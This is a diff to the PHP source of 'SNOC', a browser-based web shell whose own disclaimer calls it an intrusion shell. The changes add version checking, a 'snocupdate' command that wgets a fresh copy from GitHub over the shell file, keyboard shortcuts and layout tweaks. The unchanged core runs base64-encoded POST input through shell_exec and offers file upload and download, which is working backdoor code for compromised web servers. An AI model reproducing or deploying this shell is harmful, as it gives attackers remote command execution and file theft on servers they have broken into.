@@ -1,4 +1,8 @@
 <?php 
+
+define('SNOC_VERSION', '1.03');
+define('SNOC_CODENAME', 'Floppydisk');
+
 /**
 returns boolean if page opend as shell command
 */
@@ -17,11 +21,22 @@ function runCommand()
 	$out=shell_exec(base64_decode($_POST['c']));
 	if(is_null($out))
 	{
-		$out = ob_getcontents();
+		$out = ob_get_contents();
 	}
 	ob_end_clean();
 	// HTML Escaping with htmlentities
 	echo(base64_encode("<br/>".nl2br(htmlentities($out))));
+}
+
+/**
+ * check version
+*/
+function checkVersionCheck()
+{
+	if (isset($_POST['versionCheck'])) {
+		return true;
+	}
+	return false;
 }
 
 /**
@@ -55,6 +70,36 @@ function checkFileDownload()
 		return true;
 	}
 	return false;
+}
+
+/**
+ * do version check
+*/
+function doVersionCheck()
+{
+	$versionString = false;
+	// we open a socket because we have no guarantee that file_get_conents is enabled
+	$f = fsockopen('ssl://raw.github.com', 443);
+	$request = "GET /tjosten/SNOC/master/version.json HTTP/1.1\r\n";
+	$request.= "Host: raw.github.com\r\n";
+	$request.= "Connection: Close\r\n\r\n";
+	fwrite($f, $request);
+	while(!feof($f)) {
+		$l = fgets($f, 128);
+		if (strstr($l, '{')) {
+			$versionString = $l;
+		}
+	}
+	fclose($f);
+
+	if (!$versionString)
+		die(json_encode(array('success' => false)));
+	else
+		die($versionString);
+
+	#'https://raw.github.com/tjosten/SNOC/master/version.json';
+	#var_dump($version);
+	#echo $version;
 }
 
 /**
@@ -129,14 +174,33 @@ function echoJS()
 	// <![CDATA[
 	';
 	?>
+
+	$.ctrl = function(key, callback, args) {
+	    var isCtrl = false;
+	    $(document).keydown(function(e) {
+	        if(!args) args=[]; // IE barks when args is null
+
+	        if(e.ctrlKey) isCtrl = true;
+	        if(e.keyCode == key.charCodeAt(0) && isCtrl) {
+	            callback.apply(this, args);
+	            return false;
+	        }
+	    }).keyup(function(e) {
+	        if(e.ctrlKey) isCtrl = false;
+	    });
+	};
+
 	function Shell(){
+		var snoc_version = "<?=SNOC_VERSION?>";
+		var snoc_version_codename = "<?=SNOC_CODENAME?>";
 		var current_dir = "<?php echo dirname(__FILE__);  ?>";	// current directory
+		var self_name = window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);
 		var history = new Array();				// command history stack
 		var history_pos = 0;					// history position
 		
 		// ------SETUP AUTOCOMPLETION
 		// standard commands (in case path cannot be read later on)			
-		var knownCommands = ["ls","cd","clear","man","ping","netstat","more","less","diff","rm","mkdir","mv","cp","wc","chmod","cat"];
+		var knownCommands = ["ls","cd","clear","man","ping","netstat","more","less","diff","rm","mkdir","mv","cp","wc","chmod","cat", "snocupdate"];
 		var displayAll = false;					// to display all commands when tab is pushed
 		var tempFoundCommands = [];				// temporary array to display all matching commands for an input
 		var displayed = false;					// true when matching commands have already been displayed
@@ -146,10 +210,10 @@ function echoJS()
 
 		$("#command").focus();					// Focus the command line with cursor
 		$("#dir").empty().append(current_dir);			// Display current direcory
-		for(var i=0;i<21;i++)					// Look and feel (includes 21 <br>s)
+		for(var i=0;i<2;i++)					// Look and feel (includes 21 <br>s)
 			$("#out").append("<br/>");
 		
-		printShell('<pre style="margin-left: 170px"> #####  #     # #######  #####<br />'+  
+		printShell('<pre style="margin-left: 50px"> #####  #     # #######  #####<br />'+  
 '#     # ##    # #     # #     #<br />'+
 '#       # #   # #     # #      <br />'+ 
 ' #####  #  #  # #     # #       <br />'+
@@ -158,12 +222,15 @@ function echoJS()
 ' #####  #     # #######  #####  <br />'+                                
 '</pre><br />');
 
-		printShell('<span style="margin-left:185px">Shell is Not an Oil Company</span><br /><br />');
+		printShell('<span style="margin-left:50px">Shell is Not an Oil Company</span><br /><br /><span style="margin-left:50px;">Version '+snoc_version+' '+snoc_version_codename+'</span><br /><br />');
 	
 		printShell("<p>Welcome to the SNOC shell. For more info on what you can do with SNOC, type 'help' on the prompt.</p>"+
 		"<p><b>DISCLAIMER:</b> Although SNOC has been designed as an intrusion shell, please notice that we refuse to be held "+ 
 		"responsible for usage that results in illegal actions. We strongly advise you to use SNOC only for testing and demo "+ 
 		"purposes.<br /><br /></p>");		
+
+		// run version check
+		versionCheck();
 
 		// ------ FIRST SYS INFO
 		printShell("Current user/server setup:");
@@ -212,6 +279,10 @@ function echoJS()
 				case "alias":
 					$("#command").val("");
 					doAlias(commandArgs[1]);
+				break;
+				case "snocupdate":
+					$("#command").val("");
+					doSnocUpdate();
 				break;
 				// TODO: Add new special commands here !
 				case "":break;
@@ -340,8 +411,39 @@ function echoJS()
 			printShell("<br/><br/><table>"+
 			"<tr><th width=150>Functions</th><th>Usage</th></tr>"+
 			"<tr><td>download [file]</td><td>download [file] from current directory</td></tr>"+
+			"<tr><td>snocupdate</td><td>snoc shell auto update</td></tr>"+
 			"<tr><td>clear</td><td>clear shell prompt</td></tr>"+
 			"</table><br/><br/>");
+		}
+
+		// doSnocUpdate
+		function doSnocUpdate() {
+			printShell("<br />Starting snoc shell auto update..<br />");
+			console.log(current_dir+"/test-"+self_name);
+			//return;
+			lolWAS = 'https:/';
+			command = "wget '"+lolWAS+"/raw.github.com/tjosten/SNOC/master/snoc.php' -O "+current_dir+"/"+self_name;
+			var fullcommand = "cd "+current_dir+";"+command+" 2>&1;pwd";
+			postShell(fullcommand,function(data){
+				for(var i=data.length-3;i>0;i--) {
+					if(data[i] == ">")
+						break;
+				}
+				var output= data.substr(0,i+1);	// substr the output !
+
+				abort = false;
+				if (output.match("not found")) {
+					output = "wget not found. Download failed.<br />";
+					abort = true;
+				}
+				
+				// substr the current dir and delete <br/> tag and newline
+				current_dir = data.substr(i+1,data.length).replace(/(<([^>]+)>)/ig,"").replace(/\n/g,"");
+				printShell(output);
+				$("#dir").empty().append(current_dir);	// update the current_dir field
+				if (!abort)
+					location.reload();
+			});
 		}
 
 		// execute the alias command
@@ -384,6 +486,23 @@ function echoJS()
 				callback(decoded);
 			});
 		}
+
+		// checks through "self-proxy" for new version
+		function versionCheck() {
+			$.post("",{"versionCheck":true},function(data) {
+				if (data.success == false) {
+					printShell('<br /><p style="color:red">Version check failed. Please consider manual update or try \'snocupdate\'.</p>');
+				} else {
+					console.log(data);
+					if (data.version > snoc_version) {
+						update_string = 'Most recent snoc version: '+data.version+' '+data.codename+'. <br /><u>Update recommended! Type \'snocupdate\' for snoc auto update';
+					} else {
+						update_string = 'Most recent snoc version: '+data.version+' '+data.codename+'. No update required.';
+					}
+					printShell('<br /><p>Installed snoc version: '+snoc_version+' '+snoc_version_codename+' - '+update_string+'</p>');
+				}
+			}, 'json');			
+		}		
 
 		// ------ EVENT HANDLERS		
 		$("#command").keydown(function(event){
@@ -429,6 +548,23 @@ function echoJS()
 
 			return returnVal;
 		});
+
+		// ctrl event handlers
+		$.ctrl('C', function() {
+			event.preventDefault();
+			$("#command").val("");
+			returnVal = false;
+		});
+		$.ctrl('U', function() {
+			event.preventDefault();
+			$("#command").val("");
+			returnVal = false;
+		});		
+		$.ctrl('W', function() {
+			event.preventDefault();
+			$("#command").val($("#command").val().replace(/( ?)\w*$/, ''));
+			returnVal = false;
+		});		
 		
 		// drop down selection
 		$("#selection").change(function(){
@@ -467,6 +603,11 @@ function echoJS()
 	// if everything is loaded run :
 	$(function(){
 		var sh = new Shell();
+
+		$('#out').css('height', $(window).height()-40);
+		$(window).resize(function() {
+			$('#out').css('height', $(window).height()-40);
+		});
 	});
 	
 <?php echo '// ]]></script>';
@@ -501,46 +642,51 @@ function echoHead()
 
 	#shell{ 
 	background-color:#000;
-	width:600px;
+	width:100%;
 	margin:0 auto;
-	height:400px;
-	margin-top:20px;
-	position:relative;
-
+	height:100%;
+	margin-top:0px;
 	color:#FFF;
 	text-align:left;
 	}
 
 
 	#command{
+	position: absolute;
 	width:600px;
 	border:none;
 	background-color: #222;
 	padding:0px;
 	margin:0px;
-	position:absolute;
 	padding:3px 0px;
 	color:#FFF;
-	top:370px;
-	left:0px;
+	/*top:370px;*/
+	left:1px;
+	bottom:1px;
 	}
 
-	#out{   
-	height:340px;
-	overflow:auto;
+	#out{
+	height:400px;
+	padding: 5px;
+	padding-bottom:40px;
+	padding-top:0px;
+	width:99%;
+	overflow-y: scroll;
+	overflow-x: hidden;
 	}
 
-	#dir{   
+	#dir{ 
+	background-color:#000;  
 	position:absolute;
-	top:350px;
+	bottom: 23px;
 	left:0px;
 	color:#AB1A2D;
 	}
 
 	#action{   
 	position:absolute;
-	top:347px;
-	left:410px;
+	bottom: 2px;
+	right: 20px;
 	color:#FFF;
 	}
 	</style>
@@ -559,6 +705,10 @@ else if(checkFileUpload())
 else if(checkFileDownload())
 {
 	showFileDownload();
+}
+else if (checkVersionCheck())
+{
+	doVersionCheck();
 }
 else
 {
